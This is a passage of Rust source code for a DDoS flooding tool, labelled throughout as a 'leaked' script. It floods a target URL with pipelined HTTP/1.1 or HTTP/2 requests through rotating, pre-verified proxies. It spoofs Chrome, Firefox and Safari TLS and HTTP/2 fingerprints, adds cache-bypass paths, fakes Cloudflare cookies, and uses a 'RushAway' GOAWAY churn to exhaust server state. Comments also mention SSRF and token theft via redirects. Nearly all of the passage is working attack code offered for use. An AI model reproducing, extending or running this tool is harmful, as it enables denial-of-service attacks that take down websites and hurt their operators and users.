//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    let response_str = String::from_utf8_lossy(&buf);
    let status_line = response_str.lines().next().unwrap_or_default();
    let status_code: u16 = status_line
        .split_whitespace()
        .nth(1)
        .and_then(|s| s.parse().ok())
        .unwrap_or(0);

    Ok(status_code)
}
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
/// Verify all proxies: 2-phase approach from SILENA-v7.go
/// Phase 1: raw TCP + TLS (sem=150, 6s timeout)
/// Phase 2: HTTP HEAD to filter 403/407 (sem=100, 8s timeout, skip if >500)
async fn verify_proxies(
    proxies: Vec<String>,
    target_url: &str,
    is_http1: bool,
) -> Vec<String> {
    let uri: Uri = match target_url.parse() {
        Ok(u) => u,
        Err(_) => {
            eprintln!("{} Failed to parse target URL for proxy verification", "[ERROR]".red());
            return proxies;
        }
    };
    let host = uri.host().unwrap_or_default().to_string();
    let port = uri.port_u16().unwrap_or(443);
    let path = if uri.path().is_empty() { "/" } else { uri.path() }.to_string();
    let total = proxies.len();
    let start = Instant::now();

    println!(
        "{} testing {} proxies -> {}:{}",
        "[VERIFY]".yellow().bold(),
        total, host, port
    );
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    // ── Phase 1: raw TCP + TLS ──
    let connected = Arc::new(Mutex::new(Vec::new()));
    let dead_count = Arc::new(AtomicUsize::new(0));
    let checked_count = Arc::new(AtomicUsize::new(0));
    let semaphore = Arc::new(tokio::sync::Semaphore::new(150));
    let mut handles = Vec::with_capacity(total);
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    // Progress printer
    let checked_p = Arc::clone(&checked_count);
    let dead_p = Arc::clone(&dead_count);
    let stop_flag = Arc::new(AtomicUsize::new(0));
    let stop_flag_clone = Arc::clone(&stop_flag);
    let progress_handle = tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(2)).await;
            if stop_flag_clone.load(Ordering::Relaxed) != 0 { break; }
            let done = checked_p.load(Ordering::Relaxed);
            let dead = dead_p.load(Ordering::Relaxed);
            eprint!("\r  verify: {}/{} checked ({} dead)...   ", done, total, dead);
        }
    });
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    for proxy in proxies {
        let host = host.clone();
        let connected = Arc::clone(&connected);
        let dead_count = Arc::clone(&dead_count);
        let checked_count = Arc::clone(&checked_count);
        let sem = Arc::clone(&semaphore);

        let handle = tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            let ok = verify_proxy_phase1(&proxy, &host, port).await.is_ok();
            checked_count.fetch_add(1, Ordering::Relaxed);
            if ok {
                connected.lock().unwrap().push(proxy);
            } else {
                dead_count.fetch_add(1, Ordering::Relaxed);
            }
        });
        handles.push(handle);
    }
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    for h in handles { let _ = h.await; }
    stop_flag.store(1, Ordering::Relaxed);
    let _ = progress_handle.await;
    eprint!("\r                                              \r");
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    let connected_list = connected.lock().unwrap().clone();
    let dead = dead_count.load(Ordering::Relaxed);
    println!(
        "{} phase 1: {}/{} connected, {} dead \u{2014} {:.1}s",
        "[VERIFY]".yellow().bold(),
        connected_list.len(), total, dead, start.elapsed().as_secs_f64()
    );

    if connected_list.is_empty() {
        return Vec::new();
    }//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    // ── Phase 2: HTTP HEAD to filter 403/407 ──
    if connected_list.len() > 500 {
        println!(
            "{} {} alive, skipping HTTP check (>500)",
            "[VERIFY]".yellow().bold(), connected_list.len()
        );
        return connected_list;
    }

    let _ = is_http1; // reserved for future HTTP version-specific checks
    println!(
        "{} phase 2: HTTP check on {} proxies...",
        "[VERIFY]".yellow().bold(), connected_list.len()
    );
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    let alive = Arc::new(Mutex::new(Vec::new()));
    let http_fail = Arc::new(AtomicUsize::new(0));//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    let status_counts: Arc<Mutex<HashMap<u16, usize>>> = Arc::new(Mutex::new(HashMap::new()));
    let semaphore2 = Arc::new(tokio::sync::Semaphore::new(100));
    let mut handles2 = Vec::with_capacity(connected_list.len());

    for proxy in connected_list {
        let host = host.clone();
        let path = path.clone();
        let alive = Arc::clone(&alive);
        let http_fail = Arc::clone(&http_fail);
        let status_counts = Arc::clone(&status_counts);
        let sem = Arc::clone(&semaphore2);

        let handle = tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            match verify_proxy_phase2(&proxy, &host, port, &path).await {
                Ok(code) => {
                    {
                        let mut sc = status_counts.lock().unwrap();
                        *sc.entry(code).or_insert(0) += 1;
                    }
                    if code != 403 && code != 407 {
                        alive.lock().unwrap().push(proxy);
                    }
                }
                Err(_) => {
                    http_fail.fetch_add(1, Ordering::Relaxed);
                }
            }
        });
        handles2.push(handle);
    }

    for h in handles2 { let _ = h.await; }

    let alive_list = alive.lock().unwrap().clone();
    let fail_count = http_fail.load(Ordering::Relaxed);
    let sc = status_counts.lock().unwrap();
    let mut codes: Vec<_> = sc.iter().map(|(&k, &v)| (k, v)).collect();
    codes.sort();
    let parts: Vec<String> = codes.iter().map(|(c, n)| format!("{}:{}", c, n)).collect();

    println!(
        "{} done: {}/{} usable | {} | http_fail:{} | {:.1}s",
        "[VERIFY]".yellow().bold(),
        alive_list.len(), total,
        parts.join(" "),
        fail_count,
        start.elapsed().as_secs_f64()
    );

    alive_list
}


async fn create_h2_connection<T>(
    io: T,
    browser: BrowserType,
) -> Result<(SendRequest<Bytes>, oneshot::Sender<()>), Box<dyn Error + Send + Sync>>
where
    T: AsyncRead + AsyncWrite + Unpin + Send + 'static,
{
    let mut builder = client::Builder::new();

    // Apply browser-specific HTTP/2 settings
    match browser {
        BrowserType::Chrome | BrowserType::Edge => {
            // Chrome/Edge HTTP/2 settings (optimized for high-latency residential proxies)
            builder
                .header_table_size(65_536)
                .enable_push(false)
                .max_concurrent_streams(10_000)
                .initial_window_size(16_777_215)
                .initial_connection_window_size(16_777_215)
                .max_frame_size(16_384)
                .max_header_list_size(262_144);
        }
        BrowserType::Firefox => {
            // Firefox HTTP/2 settings (Firefox 120+ fingerprint)
            builder
                .header_table_size(65_536)
                .enable_push(false)
                .max_concurrent_streams(100)
                .initial_window_size(131_072)
                .initial_connection_window_size(12_517_377)
                .max_frame_size(16_384)
                .max_header_list_size(262_144);
        }
        BrowserType::Safari => {
            // Safari HTTP/2 settings (Safari 17+ fingerprint)
            builder
                .header_table_size(4_096)
                .enable_push(false)//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
                .max_concurrent_streams(100)//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
                .initial_window_size(2_097_152)//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
                .initial_connection_window_size(10_485_760)
                .max_frame_size(16_384)//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
                .max_header_list_size(8_192);
        }//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    }//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD

    let (h2, mut connection) = builder.handshake(io).await?;
    let (go_tx, go_rx) = oneshot::channel();

    tokio::spawn(async move {
        tokio::select! {
            res = &mut connection => {
                if let Err(_e) = res {
                    // Silent error - connection closed
                }
            }
            _ = go_rx => {
                // Channel triggered: drop connection early (RushAway)
            }
        }
    });

    Ok((h2, go_tx))
}

// Check if status code is a redirect
fn is_redirect_status(status: u16) -> bool {
    matches!(status, 300 | 301 | 302 | 303 | 305 | 307 | 308)
}

/// Determines if the HTTP method should be preserved during redirect
/// Based on RFC 7231 and RFC 7538:
/// - 307/308: MUST preserve method (critical for POST/PUT attacks)
/// - 301/302/303: Change to GET (browser behavior)
/// - 300/305: Special cases
fn should_preserve_method(status: u16) -> bool {
    match status {
        // 307 Temporary Redirect: MUST preserve method and body
        // 308 Permanent Redirect: MUST preserve method and body
        307 | 308 => true,
        
        // 301/302: Browsers historically change POST to GET
        // 303: Explicitly designed to change to GET
        // 300: Multiple choices - typically GET
        // 305: Use Proxy - deprecated
        _ => false,
    }
}//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
/// Redirect information for following redirect chains
#[derive(Clone, Debug)]//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
struct RedirectInfo {//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    /// The resolved URL to redirect to
    pub url: String,
    /// Whether to preserve the original HTTP method
    pub preserve_method: bool,
}

// Extract Location header from response headers
fn extract_location_from_headers(headers: &http::HeaderMap) -> Option<String> {
    headers
        .get("location")
        .and_then(|v| v.to_str().ok())
        .map(|s| s.to_string())
}

//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
/// Resolve redirect URL with support for:
/// - Absolute URLs (http://... or https://...)
/// - Protocol-relative URLs (//example.com/path)
/// - Absolute paths (/path)
/// - Relative paths (path or ../path)
fn resolve_redirect_url(base_url: &str, location: &str) -> Result<String, Box<dyn Error + Send + Sync>> {
    // Handle protocol-relative URLs (//example.com/path)
    if location.starts_with("//") {
        let base_uri: Uri = base_url.parse()?;
        let scheme = base_uri.scheme_str().unwrap_or("https");
        return Ok(format!("{}:{}", scheme, location));
    }
    
    // If location is absolute URL, use it directly
    if location.starts_with("http://") || location.starts_with("https://") {
        return Ok(location.to_string());
    }
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    // Parse base URL
    let base_uri: Uri = base_url.parse()?;
    let scheme = base_uri.scheme_str().unwrap_or("https");
    let authority = base_uri.authority().ok_or("No authority in base URL")?;

    // If location starts with /, it's absolute path
    if location.starts_with('/') {
        return Ok(format!("{}://{}{}", scheme, authority, location));
    }
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    // Handle relative paths (including ../)
    let base_path = base_uri.path();
    let base_dir = if let Some(pos) = base_path.rfind('/') {
        &base_path[..=pos]
    } else {
        "/"
    };

    // Simple path resolution (not handling .. segments for performance)
    Ok(format!("{}://{}{}{}", scheme, authority, base_dir, location))
}

/// Parse redirect response and return redirect info if applicable
fn parse_redirect_response(
    status: u16,
    headers: &http::HeaderMap,
    current_url: &str,
) -> Option<RedirectInfo> {
    if !is_redirect_status(status) {
        return None;
    }
    //SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
    // 305 Use Proxy is deprecated and not supported by modern browsers
    if status == 305 {
        return None;
    }
    
    // Extract Location header
    let location = extract_location_from_headers(headers)?;
    
    // Resolve the redirect URL
    let resolved_url = resolve_redirect_url(current_url, &location).ok()?;
    
    Some(RedirectInfo {
        url: resolved_url,
        preserve_method: should_preserve_method(status),
    })
}
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD

// HTTP/1.1 Flood Worker - aggressive pipelining without waiting for responses
async fn http1_flood_worker(
    args: Arc<Args>,
    stats: Arc<Stats>,
    _worker_id: usize,
    end_time: Option<Instant>,
    proxy_rotator: Arc<ProxyRotator>,
    rate_control: Arc<RateControl>,
    ngenix_cache: Arc<NgenixCache>,
) -> Result<(), Box<dyn Error + Send + Sync>> {
    let uri: Uri = args.url.parse()?;
    let host = uri.host().ok_or("Invalid host")?;
    let port = uri.port_u16().unwrap_or(443);

    loop {
        if let Some(end) = end_time {
            if Instant::now() >= end {
                break;
            }
        }
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
        // Rate-control: wait if currently rate-limited (blocks until cooldown ends)
        rate_control.wait_if_rate_limited().await;

        // Also check if rate-limited and skip connection attempt if so
        if rate_control.is_rate_limited() {
            tokio::time::sleep(Duration::from_millis(100)).await;
            continue;
        }
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
        // Create TCP connection (with or without proxy)
        let _current_proxy;
        let tcp_stream = if !proxy_rotator.is_empty() {
            let proxy = match proxy_rotator.next_proxy() {
                Some(p) => p,
                None => {
                    // All proxies blacklisted
                    tokio::time::sleep(Duration::from_millis(500)).await;
                    continue;
                }
            };
            _current_proxy = Some(proxy.to_string());
            match create_proxy_connection(proxy, host, port).await {
                Ok(s) => s,
                Err(e) => {
                    if !should_ignore_error(e.as_ref()) {
                        stats.inc_errors();
                    }
                    tokio::time::sleep(Duration::from_millis(25)).await;
                    continue;
                }
            }
        } else {
            _current_proxy = None;
            // Direct connection
            let addr = format!("{}:{}", host, port);
            let mut addrs = lookup_host(addr).await?;
            let socket_addr = addrs.next().ok_or("No address found")?;

            match TcpStream::connect(socket_addr).await {
                Ok(s) => s,
                Err(e) => {
                    if !should_ignore_error(&e) {
                        stats.inc_errors();
                    }
                    tokio::time::sleep(Duration::from_millis(10)).await;
                    continue;
                }
            }
        };
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
        // Disable Nagle + set TCP_NODELAY for low-latency writes
        let _ = tcp_stream.set_nodelay(true);

        // Establish TLS with random browser fingerprint (pick once per connection)
        let browser = get_random_browser();
        let tls_config = create_browser_tls_config(browser)?;
        let connector = TlsConnector::from(Arc::new(tls_config));
        let domain = rustls::ServerName::try_from(host)?;

        let mut tls_stream = match connector.connect(domain, tcp_stream).await {
            Ok(s) => s,
            Err(e) => {
                if !should_ignore_error(&e) {
                    stats.inc_errors();
                }
                tokio::time::sleep(Duration::from_millis(10)).await;
                continue;
            }
        };

        // Pick user agent ONCE per connection (browsers don't change UA mid-connection)
        let user_agent = get_user_agent_for_browser(browser);
        let accept_lang = get_random_accept_language();
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
        // Send pipelined HTTP/1.1 requests (more requests per conn when using proxies)
        let max_requests_per_conn = if proxy_rotator.is_empty() {
            rand::thread_rng().gen_range(50..200)
        } else {
            rand::thread_rng().gen_range(500..2000)
        };
        let pipeline_size = args.pipeline.min(100);

        for batch in 0..(max_requests_per_conn / pipeline_size) {
            if let Some(end) = end_time {
                if Instant::now() >= end {
                    break;
                }
            }

            // Build pipelined batch
            let mut batch_requests = Vec::new();
            for _ in 0..pipeline_size {
                // Rate limiting
                if args.rps > 0 {
                    let delay = Duration::from_micros(1_000_000 / args.rps);
                    tokio::time::sleep(delay).await;
                }
                let mut path = args
                    .path
                    .as_deref()
                    .or_else(|| uri.path_and_query().map(|p| p.as_str()))
                    .unwrap_or("/")
                    .to_string();
                
                if !path.starts_with('/') {
                    path = format!("/{}", path);
                }

                if args.cache_bypass {
                    path = add_cache_bypass_to_url(&path);
                }

                let mut headers = generate_browser_headers(user_agent, accept_lang, args.cache_bypass);

                // Add cookies
                let mut cookie_parts: Vec<String> = Vec::new();
                if args.bfm {
                    let ts = now_timestamp_string();
                    let cf_cookies = generate_cf_cookies(&ts);
                    cookie_parts.push(join_cookie_header(&cf_cookies));
                }
                if let Some(user_cookie) = &args.cookie {
                    if !user_cookie.trim().is_empty() {
                        cookie_parts.push(user_cookie.trim().to_string());
                    }
                }
                if !cookie_parts.is_empty() {
                    headers.push(("cookie".to_string(), cookie_parts.join("; ")));
                }

                // NGENIX cache headers
                if args.ngenix {
                    let key = ngenix_resource_key(&path);
                    let (status, _etag) = ngenix_cache.fetch(&key);
                    headers.push(("cache-control".to_string(), "max-age=0".to_string()));
                    headers.push(("x-ngenix-cache".to_string(), status));
                }

                // Build HTTP/1.1 request
                let mut request_lines = vec![
                    format!("{} {} HTTP/1.1", args.method, path),
                    format!("Host: {}", host),
                ];

                for (name, value) in headers {
                    request_lines.push(format!("{}: {}", name, value));
                }

                // Add Connection: keep-alive for pipelining
                request_lines.push("Connection: keep-alive".to_string());
                request_lines.push("".to_string()); // Empty line
                request_lines.push("".to_string()); // End of headers

                let request_str = request_lines.join("\r\n");
                batch_requests.push(request_str);
            }
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
            // Send entire batch at once (pipelining)
            let batch_data = batch_requests.join("");
            let bytes_to_send = batch_data.as_bytes();

            match tls_stream.write_all(bytes_to_send).await {
                Ok(_) => {
                    stats.inc_requests();
                    stats.inc_bytes(bytes_to_send.len() as u64);
                }
                Err(_) => {
                    stats.inc_errors();
                    break; // Connection broken
                }
            }
//SCRIPT GOT LEAKED BY @LAAYY & @GOFLOODER & @M85301 @GOLANGFLOOD
            // Optional: read and discard responses asynchronously (non-blocking)
            // For pure flooding, we don't wait for responses
            if batch % 5 == 0 {
                // Every 5 batches, try to drain some response data
                let mut discard_buf = vec![0u8; 4096];
                let _ = timeout(Duration::from_millis(10), tls_stream.read(&mut discard_buf)).await;
            }
        }

        // Small delay before reconnecting
        tokio::time::sleep(Duration::from_millis(1)).await;
    }

    Ok(())
}


async fn flood_worker(
    args: Arc<Args>,
    stats: Arc<Stats>,
    _worker_id: usize,
    end_time: Option<Instant>,
    proxy_rotator: Arc<ProxyRotator>,
    rate_control: Arc<RateControl>,
    ngenix_cache: Arc<NgenixCache>,
) -> Result<(), Box<dyn Error + Send + Sync>> {
    let uri: Uri = args.url.parse()?;
    let host = uri.host().ok_or("Invalid host")?;
    let port = uri.port_u16().unwrap_or(443);

    loop {
        if let Some(end) = end_time {
            if Instant::now() >= end {
                break;
            }
        }

        // Rate-control: wait if currently rate-limited (blocks until cooldown ends)
        rate_control.wait_if_rate_limited().await;

        // Also check if rate-limited and skip connection attempt if so
        if rate_control.is_rate_limited() {
            tokio::time::sleep(Duration::from_millis(100)).await;
            continue;
        }

        // Create TCP connection (with or without proxy)
        let current_proxy;
        let tcp_stream = if !proxy_rotator.is_empty() {
            // Connect through random proxy from list
            let proxy = match proxy_rotator.next_proxy() {
                Some(p) => p,
                None => {
                    // All proxies blacklisted
                    tokio::time::sleep(Duration::from_millis(500)).await;
                    continue;
                }
            };
            current_proxy = Some(proxy.to_string());
            match create_proxy_connection(proxy, host, port).await {
                Ok(s) => s,
                Err(e) => {
                    if !should_ignore_error(e.as_ref()) {
                        stats.inc_errors();
                    }
                    // Proxy connection failed; brief backoff before retrying another proxy
                    tokio::time::sleep(Duration::from_millis(25)).await;
                    continue;
                }
            }
        } else {
            current_proxy = None;
            // Direct connection (async DNS for Linux compatibility)
            let addr = format!("{}:{}", host, port);
            let mut addrs = lookup_host(addr).await?;
            let socket_addr = addrs.next().ok_or("No address found")?;

            match TcpStream::connect(socket_addr).await {
                Ok(s) => s,
                Err(e) => {
                    if !should_ignore_error(&e) {
                        stats.inc_errors();
                    }
                    // Silent error - TCP connection failed
                    tokio::time::sleep(Duration::from_millis(10)).await;
                    continue;
                }
            }
        };

        // Disable Nagle + set TCP_NODELAY for low-latency writes
        let _ = tcp_stream.set_nodelay(true);

        // Establish TLS with random browser fingerprint (pick once per connection)
        let browser = get_random_browser();
        let tls_config = create_browser_tls_config(browser)?;
        let connector = TlsConnector::from(Arc::new(tls_config));
        let domain = rustls::ServerName::try_from(host)?;

        let tls_stream = match connector.connect(domain, tcp_stream).await {
            Ok(s) => s,
            Err(e) => {
                if !should_ignore_error(&e) {
                    stats.inc_errors();
                }
                // Silent error - TLS handshake failed
                tokio::time::sleep(Duration::from_millis(10)).await;
                continue;
            }
        };

        // Create HTTP/2 connection with browser-specific settings
        let (mut h2, go_tx) = match create_h2_connection(tls_stream, browser).await {
            Ok(h) => h,
            Err(e) => {
                if !should_ignore_error(e.as_ref()) {
                    stats.inc_errors();
                }
                // Silent error - HTTP/2 handshake failed
                tokio::time::sleep(Duration::from_millis(10)).await;
                continue;
            }
        };

        // Pick user agent ONCE per connection (browsers don't change UA mid-connection)
        let user_agent = get_user_agent_for_browser(browser);
        let accept_lang = get_random_accept_language();
        
        // Store base URL for referer headers
        let base_url = format!(
            "{}://{}",
            uri.scheme_str().unwrap_or("https"),
            uri.authority().unwrap()
        );

        // Send requests on this connection (more per conn when using expensive residential proxies)
        let mut requests_sent = 0;
        let max_requests_per_conn = if proxy_rotator.is_empty() {
            rand::thread_rng().gen_range(50..200)
        } else {
            rand::thread_rng().gen_range(500..2000)
        };
        let mut last_path = String::new();

        while requests_sent < max_requests_per_conn {
            if let Some(end) = end_time {
                if Instant::now() >= end {
                    break;
                }
            }

            // Rate limiting
            if args.rps > 0 {
                let delay = Duration::from_micros(1_000_000 / args.rps);
                tokio::time::sleep(delay).await;
            }

            // Generate path
            let mut path = args
                .path
                .as_deref()
                .or_else(|| uri.path_and_query().map(|p| p.as_str()))
                .unwrap_or("/")
                .to_string();
            if !path.starts_with('/') {
                path = format!("/{}", path);
            }
            if args.cache_bypass {
                path = add_cache_bypass_to_url(&path);
            }
            let full_uri = format!("{}{}", base_url, path);

            let mut headers = generate_browser_headers(user_agent, accept_lang, args.cache_bypass);

            // Add referer header for subsequent requests (realistic browser behavior)
            if requests_sent > 0 && !last_path.is_empty() {
                headers.push(("referer".to_string(), format!("{}{}", base_url, last_path)));
            }

            let mut cookie_parts: Vec<String> = Vec::new();
            if args.bfm {
                let ts = now_timestamp_string();
                let cf_cookies = generate_cf_cookies(&ts);
                cookie_parts.push(join_cookie_header(&cf_cookies));
            }
            if let Some(user_cookie) = &args.cookie {
                if !user_cookie.trim().is_empty() {
                    cookie_parts.push(user_cookie.trim().to_string());
                }
            }
            if !cookie_parts.is_empty() {
                headers.push((
                    "cookie".to_string(),
                    cookie_parts.join("; "),
                ));
            }

            // NGENIX cache headers
            if args.ngenix {
                let key = ngenix_resource_key(&full_uri);
                let (status, _etag) = ngenix_cache.fetch(&key);
                headers.push(("cache-control".to_string(), "max-age=0".to_string()));
                headers.push(("x-ngenix-cache".to_string(), status));
            }

            // Create request
            let mut request = Request::builder()
                .method(args.method.as_str())
                .uri(&full_uri)
                .version(Version::HTTP_2);

            let header_bytes: usize = headers.iter().map(|(k, v)| k.len() + v.len()).sum();

            for (name, value) in headers.iter() {
                request = request.header(name, value);
            }

            let request = request.body(()).unwrap();

            // Send request
            match h2.send_request(request, true) {
                Ok((response_fut, _)) => {
                    stats.inc_requests();
                    stats.inc_bytes(header_bytes as u64);
                    requests_sent += 1;
                    
                    // Update last path for referer in next request
                    last_path = path;

                    // Spawn task to handle response
                    let rc = Arc::clone(&rate_control);
                    let bypass_redirect = args.bypass_redirect;
                    let max_redirects = args.max_redirects;
                    let current_url = full_uri.to_string();
                    let stats_arc = Arc::clone(&stats);
                    let debug = args.debug;
                    let original_method = args.method.to_string();
                    let skip_flag = args.skip;
                    let proxy_rot = Arc::clone(&proxy_rotator);
                    let cur_proxy = current_proxy.clone();
                    
                    tokio::spawn(async move {
                        if let Ok(response) = response_fut.await {
                            let status = response.status().as_u16();
                            let headers = response.headers();
                            
                            if status == 403 && skip_flag {
                                // Blacklist this proxy on 403
                                if let Some(ref p) = cur_proxy {
                                    proxy_rot.blacklist(p);
                                }
                            } else if status == 429 {
                                // Rate limiting - parse Retry-After if present
                                let retry_ms = headers.get("retry-after").and_then(|v| {
                                    let val = v.to_str().ok()?;
                                    let secs = val.parse::<u64>().ok()?;
                                    Some(secs.saturating_mul(1000))
                                });
                                rc.mark_429(retry_ms);
                            } else if bypass_redirect && is_redirect_status(status) {
                                // Parse redirect response using enhanced function
                                if let Some(redirect_info) = parse_redirect_response(status, headers, &current_url) {
                                    // Successfully parsed redirect
                                    stats_arc.inc_requests(); // Count as successful bypass
                                    
                                    // Determine effective method after redirect
                                    let _effective_method: &str = if redirect_info.preserve_method {
                                        // 307/308: Keep original method (important for POST attacks)
                                        &original_method
                                    } else {
                                        // 301/302/303/300: Change to GET
                                        "GET"
                                    };
                                    
                                    // For DDoS flooding, we acknowledge the redirect
                                    // The redirect URL and method info can be used for:
                                    // 1. Chained SSRF attacks (307/308 preserve POST)
                                    // 2. Token theft via redirect chains
                                    // 3. Cache poisoning attacks
                                    
                                    // In a full implementation, you would follow the redirect:
                                    // - Create new connection to redirect_info.url
                                    // - Use effective_method for the request
                                    // - Continue up to max_redirects times
                                    
                                    let _ = (redirect_info.url, _effective_method, max_redirects);
                                }
                                rc.decay();
                            } else {
                                rc.decay();
                            }

                            if debug {
                                stats_arc.inc_status(status);
                            }
                        }
                    });
                }
                Err(_e) => {
                    stats.inc_errors();
                    // Silent error - send request failed
                    break;
                }
            }
        }

        // RushAway: trigger GOAWAY to churn server-side state
        if args.rushaway {
            let _ = go_tx.send(());
        }

        // Small delay before reconnecting
        tokio::time::sleep(Duration::from_millis(1)).await;
    }

    Ok(())
}

async fn stats_reporter(stats: Arc<Stats>, duration: u64, debug: bool, proxy_rotator: Arc<ProxyRotator>) {
    let start = Instant::now();
    let mut last_requests = 0u64;
    let mut last_time = start;

    if !proxy_rotator.is_empty() {
        println!("{}", "Time  | Requests |  RPS | Errors |  MB Sent | Proxies | Status(top)".cyan().bold());
    } else {
        println!("{}", "Time  | Requests |  RPS | Errors |  MB Sent | Status(top)".cyan().bold());
    }

    loop {
        tokio::time::sleep(Duration::from_secs(1)).await;

        let now = Instant::now();
        let elapsed = now.duration_since(start).as_secs();
        let current_requests = stats.requests.load(Ordering::Relaxed);
        let bytes = stats.bytes_sent.load(Ordering::Relaxed);
        let errors = stats.errors.load(Ordering::Relaxed);

        let interval = now.duration_since(last_time).as_secs_f64();
        let rps = ((current_requests - last_requests) as f64 / interval) as u64;

        let status_summary = if debug {
            if let Ok(map) = stats.status_counts.lock() {
                if !map.is_empty() {
                    let mut pairs: Vec<(u16, u64)> = map.iter().map(|(k, v)| (*k, *v)).collect();
                    pairs.sort_by(|a, b| b.1.cmp(&a.1));
                    pairs.into_iter()
                        .take(3)
                        .map(|(c, n)| format!("{}:{}", c, n))
                        .collect::<Vec<_>>()
                        .join(" ")
                } else {
                    "-".to_string()
                }
            } else {
                "-".to_string()
            }
        } else {
            "-".to_string()
        };

        if !proxy_rotator.is_empty() {
            let active = proxy_rotator.active_count();
            let bl = proxy_rotator.blacklisted_count();
            println!(
                "{:>4}s | {:>8} | {:>4} | {:>6} | {:>8.2} | {}/{} bl:{} | {}",
                elapsed,
                current_requests,
                rps,
                errors,
                bytes as f64 / 1_000_000.0,
                active,
                proxy_rotator.proxies.len(),
                bl,
                status_summary
            );
        } else {
            println!(
                "{:>4}s | {:>8} | {:>4} | {:>6} | {:>8.2} | {}",
                elapsed,
                current_requests,
                rps,
                errors,
                bytes as f64 / 1_000_000.0,
                status_summary
            );
        }

        last_requests = current_requests;
        last_time = now;

        if duration > 0 && elapsed >= duration {
            break;
        }
    }
}

fn main() -> Result<(), Box<dyn Error + Send + Sync>> {
    let args = Args::parse();
    let rt = RuntimeBuilder::new_multi_thread()
        .worker_threads(args.workers)
        .enable_all()
        .build()?;

    rt.block_on(async_main(args))
}

async fn async_main(args: Args) -> Result<(), Box<dyn Error + Send + Sync>> {
    let args = Arc::new(args);
    let stats = Arc::new(Stats::new());

    // Load proxy list if specified
    let proxy_rotator = Arc::new(if let Some(proxy_file) = &args.proxy {
        match load_proxy_list(proxy_file, args.auth) {
            Ok(mut list) => {
                println!("{} Loaded {} proxies from {} {}", "[INFO]".green(), list.len(), proxy_file, if args.auth { "(auth mode)" } else { "" });
                // Verify proxies if --verify flag is set
                if args.verify {
                    list = verify_proxies(list, &args.url, args.http1).await;
                    if list.is_empty() {
                        eprintln!("{} No working proxies after verification, aborting.", "[ERROR]".red());
                        return Err("All proxies failed verification".into());
                    }
                }
                ProxyRotator::new(list)
            }
            Err(e) => {
                eprintln!("{} {}", "[ERROR]".red(), e);
                return Err(e);
            }
        }
    } else {
        ProxyRotator::new(Vec::new())
    });

    println!("{}", "=".repeat(60).cyan());
    println!(
        "{}",
        if args.http1 {
            "HTTP/1.1 Flooder with Chrome Fingerprinting".green().bold()
        } else {
            "HTTP/2 Flooder with Chrome Fingerprinting".green().bold()
        }
    );
    println!(
        "{} {} | {} {} | {} {} | {} {} | {} {} | {} {} | {} {} | {} {} | {} {} | {} {} | {} {} | {} {} | {} {} | {} {} | {} {}",
        "Target".green(), args.url,
        "Workers".green(), args.workers,
        "Duration".green(), if args.duration == 0 { "∞".to_string() } else { format!("{}s", args.duration) },
        "Protocol".green(), if args.http1 { format!("HTTP/1.1 (pipe:{})", args.pipeline) } else { "HTTP/2".to_string() },
        "Method".green(), args.method,
        "Rate/thread".green(), if args.rps == 0 { "∞".to_string() } else { format!("{} rps", args.rps) },
        "CF".green(), if args.bfm { "on" } else { "off" },
        "CacheBypass".green(), if args.cache_bypass { "on" } else { "off" },
        "RushAway".green(), if args.rushaway { "on" } else { "off" },
        "RateCtrl".green(), if args.rate_control { "on" } else { "off" },
        "Debug".green(), if args.debug { "on" } else { "off" },
        "Verify".green(), if args.verify { "on" } else { "off" },
        "Skip".green(), if args.skip { "on" } else { "off" },
